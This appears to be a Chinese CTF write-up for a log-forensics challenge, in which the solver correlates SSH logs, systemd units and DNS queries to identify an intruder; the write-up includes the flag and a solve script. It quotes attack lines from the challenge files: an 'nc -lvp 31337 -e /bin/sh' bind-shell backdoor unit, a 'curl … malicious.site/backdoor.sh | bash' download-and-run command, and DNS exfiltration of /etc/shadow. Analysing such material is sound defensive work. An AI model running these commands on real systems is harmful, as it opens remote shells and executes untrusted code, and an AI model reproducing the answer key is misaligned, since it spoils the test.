# misc01 · 被入侵服务器日志取证（SSH 爆破 / systemd 后门 / DNS 外带三源关联）

| 项 | 值 |
|----|----|
| 轮次 | 环节二（13:30） |
| 平台题目名 | misc01 |
| 比赛 qid | SNdmyaqEfKnrv3mD |
| 分类 | misc |
| 分值 | 500 |
| 交互型 | false（静态附件） |
| 关键 flag | `flag{attacker_192.168.42.77_hidden_backdoor_data.leak.ev}` |
| 是否解出 | 已解出（2026-09-14 13:33:12） |
| **还原完整度** | **A**（原始附件原样归档 + 参考脚本可跑、实测出 flag） |

## 1. 题面（比赛原文，逐字保留）

> 某服务器被入侵，请分析日志并回答：1. 攻击者使用的SSH用户名和IP2. 植入的恶意服务名称3. 泄露机密文件时使用的DNS域名提交形式：flag{SSH用户名_IP_恶意服务名称(不包括后缀)_DNS域名(固定部分)}

说明：以上为平台 `description` 字段的**原文**（`D:\2026\湾区杯\决赛\challenges_live.json`），原字段内没有换行与空格，
三个小问的序号「1./2./3.」与后文是直接连排的。本环境无 hint 泄露文本。

## 2. 附件与环境

| 项 | 内容 |
|----|------|
| 附件 | `e4dccc50e240c6b0c34cf94db7d4e4b3.zip`，22,903 B，ZIP（内含伪造的 Linux 根目录树） |
| 附件下载地址 | `https://g.ichunqiu.com/terminator/production/match_question/202609/e4dccc50e240c6b0c34cf94db7d4e4b3.zip` |
| 容器 | 无（`interactive: "false"`，`connection: []`） |
| 附件存放 | `attachments/e4dccc50e240c6b0c34cf94db7d4e4b3.zip`（原始件）＋ `attachments/extracted/`（解包结果，未改字节） |

zip 内文件清单（解包后实测）：

| 路径 | 大小 | 作用 |
|------|------|------|
| `etc/systemd/system/hidden_backdoor.service` | 237 B | **真后门** |
| `etc/systemd/system/suspicious.service` | 204 B | 诱饵（名字最可疑，内容无害） |
| `etc/systemd/system/normal.service` | 147 B | 诱饵（`sleep infinity`） |
| `opt/backup.sh` | 626 B | 被注入同源恶意命令的备份脚本（交叉印证用） |
| `var/log/auth.log` | 19,652 B（217 行） | SSH 认证日志，主噪声源 |
| `var/log/dnsmasq.log` | 48,867 B（624 行） | DNS 查询日志，外带通道 |
| `var/log/syslog` | 38,173 B（512 行） | 纯凑数噪声 |
| `var/log/audit.log` | 29,302 B（322 行） | 纯凑数噪声（随机 action/path/exe） |

## 3. 考点（★核心）

- **考点 1｜多源日志关联取证（tri-source correlation）**：flag 的 4 个字段分别落在 3 个互不相干的证据源上
  （用户名/IP ← `auth.log`，服务名 ← `systemd` unit，域名 ← `dnsmasq.log`），必须三个源全部跑通才能拼出答案；
  单看任何一个源都无法定论。
- **考点 2｜"成功登录"信号与诱饵的分离（noise vs. signal）**：`var/log/auth.log` 217 行里
  `Failed password` **97** 条、`Invalid user` **103** 条是爆破噪声；更毒的是 **15 条 `Accepted publickey`
  for admin/user/backup from <15 个不同公网 IP>**（伪造的"成功登录"）。唯一真信号是
  `Accepted password for attacker from 192.168.42.77 port 1337` —— 按 "Accepted" 关键字筛会得到 16 个候选。
- **考点 3｜systemd unit 语义审计（后门四要素）**：`ExecStart=/bin/sh -c "nc -lvp 31337 -e /bin/sh"`
  ＋ `User=root` ＋ `Restart=always` ＋ `Description=System Backdoor Service (Disguised)`。
  判据必须是 **ExecStart 里出现"监听 + 交 shell"（`nc -l … -e`）**，而不是文件名里的 `backdoor/suspicious` 字样。
- **考点 4｜DNS 外带（DNS exfiltration）识别**：`dnsmasq.log` 中**子域最左标签是 Base64**
  （`CiAgICByb290Oio6MTk0Nzk6MDo5OTk5OTo3Ojo6.data.leak.ev`），固定域名部分为 `data.leak.ev`；
  4 条 `query[A]` 时间戳 `02:40:15 / :17 / :19 / :21`，**间隔恰好 2 秒**，源 IP 与 SSH 登录源一致。
- **考点 5｜Base64 分片按时间序重组（chunk reassembly）**：单条标签解码得到的是**跨片碎片**
  （第 2 片以 `\n…\na` 结尾、第 4 片以 `…password:19479…` 开头），必须按时间顺序拼接才能得到完整
  `/etc/shadow` 行：`root:*` / `daemon:*` / `attacker:$6$secret$encryptedpassword:19479:0:99999:7:::`。
- **考点 6｜跨源实体归一化（cross-source entity reconciliation）**：`opt/backup.sh` 尾部被注入
  `curl -s http://malicious.site/backdoor.sh | bash -s &`，与 `auth.log` 里
  `sudo: attacker : COMMAND=curl -s http://malicious.site/backdoor.sh | bash` 同源，
  据此确认 `attacker@192.168.42.77` 是入侵者，而不是被爆破波及的普通账户。

## 4. 设计思路（★核心，站在出题人角度）

- **为什么这样出**：取"应急响应"的真实工作流——不是"找到一个可疑日志就算破案"，而是要把
  **人（用户名）、位置（IP）、持久化（服务）、外带通道（域名）** 四要素从不同证据源里归一到同一个攻击者实体上。
  四个字段分别放在三个文件里，逼解题者做关联而不是单点匹配。
- **难度卡点设计在哪**：
  1. **减法而非加法**：每个来源的有效信号都恰好只有 1 条（1 条 `Accepted password`、1 个真后门、
     1 个固定域名），而噪声是 600+ 条；没有"多找几条来交叉"的退路，必须精确挑出唯一的那个。
  2. **字段拼写必须逐字精确**：服务名要去掉 `.service` 后缀（题面写明"不包括后缀"）、域名只取固定部分
     （不能带前面的 Base64 标签）、IP 不能写成 1337 端口所在的源。任一处取错就全盘皆错。
  3. **分片重组**：DNS 载荷不以单条为语义单位，必须按时间序拼接，否则会得到
     `sword:19479:…` / `ttacker:$6$…` 这种断头内容。
- **干扰项 / 诱导项**：
  - `suspicious.service`（名字最可疑、`Description=Suspicious Service (Actually harmless)`）与
    `normal.service`（`sleep infinity`）—— 典型的"按名字下判断就翻车"。
  - `auth.log` 的 **15 条 `Accepted publickey`**：把"成功登录"这个关键词污染掉，是本题最关键的一层诱导。
  - `dnsmasq.log` 里 620 条普通查询：4 种 qtype（A/AAAA/MX/TXT）混排的
    `stackoverflow.com` / `aws.amazon.com` / `wikipedia.org` / `example.com`，并附加伪路径
    （`example.com/images`、`…/blog`、`…/api`）与 621 个互不相同的随机源 IP，把"哪条是隧道"藏进正常 DNS 里。
  - `syslog`（512 行）与 `audit.log`（322 行）是纯填充物（`sshd[1000+i]`、随机 `action/path/exe`），
    专门消耗"全量 grep"的时间预算。
  - `opt/backup.sh` 里的 `rm -rf /tmp/.cache` / `find /var/tmp -type f -mtime +7 -delete` 是伪装成
    "清理任务"的破坏性语句，但真正的注入点是那行 `curl … | bash`。
- **必须踩坑才会发现的地方**：① 只用 `grep Accepted` 会误入 15 条 publickey 诱饵；
  ② 逐条 Base64 解码 DNS 标签会得到语义不完整的碎片；③ 把 `suspicious` 当成答案。

## 5. 解题路径（按真实过程，分步骤）

1. **侦察**：解包 zip，清点目录树 —— 这是一个被伪造出来的 `/` 根文件系统快照（`etc/`、`opt/`、`var/log/`）。
   ```bash
   python -c "import zipfile;zipfile.ZipFile('attachments/e4dccc50e240c6b0c34cf94db7d4e4b3.zip').extractall('attachments/extracted')"
   ls -R attachments/extracted
   ```
2. **第 1 个字段（SSH 用户名 + IP）**：只取**口令认证成功**且随后有 sudo 提权动作的那条。
   ```bash
   grep -n "Accepted password" attachments/extracted/var/log/auth.log
   # Jun 15 02:30:15 server sshd[5678]: Accepted password for attacker from 192.168.42.77 port 1337
   grep -c "Failed password" attachments/extracted/var/log/auth.log   # 97  → 噪声
   grep -c "Accepted publickey" attachments/extracted/var/log/auth.log # 15  → 伪成功登录诱饵
   grep -n "sudo:" attachments/extracted/var/log/auth.log
   # Jun 15 02:30:30 server sudo: attacker : TTY=pts/0 ; COMMAND=curl -s http://malicious.site/backdoor.sh | bash
   ```
3. **第 2 个字段（恶意服务名）**：审计所有 unit 的 `ExecStart`。
   ```bash
   grep -n "ExecStart" attachments/extracted/etc/systemd/system/*.service
   # hidden_backdoor.service: ExecStart=/bin/sh -c "nc -lvp 31337 -e /bin/sh"   ← 真后门
   # normal.service:          ExecStart=/usr/bin/sleep infinity
   # suspicious.service:      ExecStart=/usr/bin/echo "This service is harmless"
   ```
   交叉印证同源命令（这一步把"人-机-服务"钉在一起）：
   ```bash
   tail -3 attachments/extracted/opt/backup.sh
   # curl -s http://malicious.site/backdoor.sh | bash -s >/dev/null 2>&1 &
   ```
4. **第 3 个字段（DNS 外带域名）**：从 624 行里挑出 Base64 形态的最左标签。
   ```bash
   grep -n "data.leak.ev" attachments/extracted/var/log/dnsmasq.log
   ```
5. **取 flag**：按时间序 Base64 解码并拼接（验证外带内容确为 `/etc/shadow`），再按题面模板拼接。
   ```bash
   python solve/solve.py --attach attachments/e4dccc50e240c6b0c34cf94db7d4e4b3.zip
   # [1] SSH  : user=attacker ip=192.168.42.77
   # [2] UNIT : hidden_backdoor
   # [3] DNS  : fixed-domain=data.leak.ev  source=192.168.42.77  chunks=4
   # FLAG: flag{attacker_192.168.42.77_hidden_backdoor_data.leak.ev}
   ```

## 6. 参考解法（代码）

完整可跑脚本：`solve/solve.py`（标准库，无第三方依赖；支持 `--attach <zip>` 或 `--dir <已解包目录>`）。
核心片段：

```python
RE_ACCEPTED_PW = re.compile(r"Accepted\s+password\s+for\s+(?P<user>\S+)\s+from\s+(?P<ip>\d+\.\d+\.\d+\.\d+)")
RE_BACKDOOR_EXEC = re.compile(r"ExecStart\s*=\s*.*?(?:nc|ncat|socat)\b.*?-e\b", re.I)
RE_DNS_QUERY = re.compile(r"query\[(?P<qtype>[A-Za-z]+)\]\s+(?P<label>[A-Za-z0-9+/=_-]+)\.(?P<domain>[A-Za-z0-9.\-]+)\s+from\s+(?P<src>\S+)")
RE_SHADOW = re.compile(r"(?::\d+:\d+:\d+:|:\$6?\$|^root:|^daemon:)", re.M)

# [1] 唯一“口令认证成功” = 攻击者
user, ip, line = step1_ssh(root)          # attacker / 192.168.42.77
# [2] ExecStart 里出现 “nc -l … -e” 的 unit = 真后门
svc, scores = step2_service(root)         # hidden_backdoor
# [3] 最左标签 Base64 解码后“像 /etc/shadow”的查询 = 外带分片，按时间序拼接
domain, src, chunks = step3_dns(root)     # data.leak.ev
flag = "flag{%s_%s_%s_%s}" % (user, ip, svc, domain)
```

## 7. Flag 与验证记录

| 项 | 值 |
|----|----|
| flag | `flag{attacker_192.168.42.77_hidden_backdoor_data.leak.ev}` |
| 提交接口返回 | `code=0`，`status=None`，`message="恭喜您，回答正确"`（`pass=true`） |
| 提交时间 | 2026-09-14 13:33:12 |
| 证据文件 | `D:\2026\湾区杯\决赛\work\submit_results_live.json` 中 `qid=SNdmyaqEfKnrv3mD` 的记录 |

## 8. 还原说明（诚实写）

- **已有原始件**：`attachments/e4dccc50e240c6b0c34cf94db7d4e4b3.zip`（从平台 `file_url` 原样下载，未改字节）；
  `attachments/extracted/` 下 8 个文件由该 zip 解包得到，**与 zip 内字节一致**。
- **重建部分**：`solve/solve.py` 是本次按 §5 步骤**重写**的通用脚本（原始比赛脚本为
  `work\misc01\misc01_solve.py`，思路一致但判据更宽松：原版靠"分数最高"挑 unit、靠 DNS 标签长度过滤，
  本版改为 `ExecStart` 结构化判据 + 解码后必须"像 /etc/shadow"双重校验，对同类题更稳）。
  README §3/§4 的条数统计（97/103/15/4/620/624 等）为本次**实测**数字，非引用。
- **未能还原**：无。原始附件、解包文件、flag、提交回执齐全。
- **可复现性验证（已实测）**：
  - `python solve/solve.py --attach attachments/e4dccc50e240c6b0c34cf94db7d4e4b3.zip`
    → 打印 `user=attacker ip=192.168.42.77` / `hidden_backdoor` / `data.leak.ev` / 4 条分片重组结果
    → `FLAG: flag{attacker_192.168.42.77_hidden_backdoor_data.leak.ev}` ✅
  - `python solve/solve.py --dir attachments/extracted` → 同一 flag ✅（两种入口均验证）
  - 重组出的明文与 `/etc/shadow` 语义自洽（`root:*` / `daemon:*` / `attacker:$6$secret$encryptedpassword:…`），
    是"DNS 外带内容正确"的独立证据。

## 9. 复现步骤

```bash
cd timu/round2_1330/misc01

# 1) 静态题：直接对原始附件跑参考脚本（无需容器、无需第三方依赖）
python solve/solve.py --attach attachments/e4dccc50e240c6b0c34cf94db7d4e4b3.zip
# 期望：FLAG: flag{attacker_192.168.42.77_hidden_backdoor_data.leak.ev}

# 2) 也可以先自行解包再跑（验证解包字节一致性）
python -c "import zipfile;zipfile.ZipFile('attachments/e4dccc50e240c6b0c34cf94db7d4e4b3.zip').extractall('attachments/extracted')"
python solve/solve.py --dir attachments/extracted
```
